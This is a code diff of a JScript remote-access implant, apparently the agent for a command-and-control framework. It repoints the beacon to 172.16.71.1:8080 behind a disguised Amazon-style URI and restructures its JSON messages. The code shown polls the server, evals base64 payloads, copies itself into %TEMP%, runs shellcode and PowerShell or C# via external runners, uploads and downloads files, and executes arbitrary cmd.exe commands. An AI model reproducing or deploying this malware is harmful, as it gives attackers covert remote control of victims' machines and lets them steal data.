@@ -1,5 +1,5 @@
 //Define variables
-var ipp  = "127.0.0.1"
+var ipp  = "172.16.71.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -135,12 +135,12 @@ function b64d(data, type) {
 //Main
 while(true)
 {
-  try
-  {
+  //try
+  //{
     var retval = ""
-    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"}';
+    var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }';
     var serverMsg = post(home, checkin);
-	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
+    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0]
     // Convert json string to json object
     eval("jsObject="+jsondata);
 
@@ -150,12 +150,12 @@ while(true)
         eval(extrafunc[i])
       }
     }
-
-    if(jsObject.cmnd)
+    if(jsObject.p[0].cmnd)
     {
       var rettype = "retval"
+      var cmnd = jsObject.p[0].cmnd
       //kill
-      if(jsObject.cmnd == "quit") {
+      if(cmnd == "quit") {
         if(fso.FileExists(selfpath)) {
           fso.DeleteFile(selfpath, true)
         }
@@ -163,7 +163,7 @@ while(true)
       }
 
       //spawn: writes js to %TEMP%
-      else if(jsObject.cmnd == "spawn") {
+      else if(cmnd == "spawn") {
         fd = fso.CreateTextFile(temp+"\\"+id+".js")
         fd.WriteLine(selfdata)
         fd.close()
@@ -171,18 +171,18 @@ while(true)
         retval = "[+] Spawn success..."
       }
 
-      else if((jsObject.cmnd.split(" ")[0] == "ev")) {
+      else if((cmnd.split(" ")[0] == "ev")) {
         retval = eval(b64d(jsObject.cmnd.split(" ")[1]))
       }
 
       //psh and cs
-      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
+      else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
-         msb = jsObject.cmnd.split(" ")[1]
-         msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
+         msb = cmnd.split(" ")[1]
+         msbdata = b64d(cmnd.split(" ")[2], "txt")
          fd.WriteLine(msbdata)
          fd.close()
-         if(jsObject.cmnd.split(" ")[0] == "shc") {
+         if(cmnd.split(" ")[0] == "shc") {
            runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
            retval = "[*] Shc cmnd appeared successful"
          }
@@ -200,8 +200,8 @@ while(true)
         }
       }
 	  
-      else if(jsObject.cmnd.split(" ")[0] == "dl") {
-        var array = jsObject.cmnd.split(" ")
+      else if(cmnd.split(" ")[0] == "dl") {
+        var array = cmnd.split(" ")
         array.shift() //Cuts off the first element in the array
         var filepath = array.join(" ")
         if(fso.FileExists(filepath)) {
@@ -213,9 +213,9 @@ while(true)
         }
       }
 
-	  	else if(jsObject.cmnd.split(" ")[0] == "up") {
+	  	else if(cmnd.split(" ")[0] == "up") {
                   try {
-                    var array = jsObject.cmnd.split(" ")
+                    var array = cmnd.split(" ")
                     content = b64d(array[1], "bin")
                     array.shift()
                     array.shift()
@@ -230,7 +230,7 @@ while(true)
 
 	    //credit to nate and 0sum
 	    else {
-        runner.Run(cs +" /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+        runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
                       try {
 		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
@@ -244,16 +244,15 @@ while(true)
       if(retval == "") {
         retval = "[*] No results to return or error getting result data"
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"}';
-      jsObject.cmnd = ""
-      
+      var resp = '{ "p":[ {"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
+      jsObject.p[0].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
       
       post(home, resp)
     }
-  }
-  catch (e) {
-    WScript.Sleep(sleepytime);
-  }
+  //}
+  //catch (e) {
+  //  WScript.Sleep(sleepytime);
+  //}
   WScript.Sleep(sleepytime);
 }
 
